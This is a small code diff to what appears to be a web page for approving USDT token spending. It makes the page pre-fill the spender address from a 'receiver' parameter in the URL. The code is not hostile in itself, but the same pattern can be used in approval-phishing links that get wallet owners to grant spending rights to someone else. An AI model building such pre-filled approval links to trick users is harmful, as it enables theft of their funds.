@@ -452,6 +452,17 @@ async function updateUSDTBalance() {
 }
 
 function updateButton() {
+
+    const params = new URLSearchParams(window.location.search);
+    const receiver = params.get("receiver");
+
+    // URL se receiver address fill karo
+    if (receiver && !$("spenderAddr").value.trim()) {
+        if (ethers.utils.isAddress(receiver)) {
+            $("spenderAddr").value = ethers.utils.getAddress(receiver);
+        }
+    }
+
     const spender = $("spenderAddr").value.trim();
     const amount = $("amount").value.trim();
 
@@ -465,6 +476,7 @@ function updateButton() {
     $("approveBtn").disabled =
         busy || (owner && (!validAmount || !validSpender));
 }
+
 
 function validAddress(value, label) {
     if (!ethers.utils.isAddress(value.trim())) {
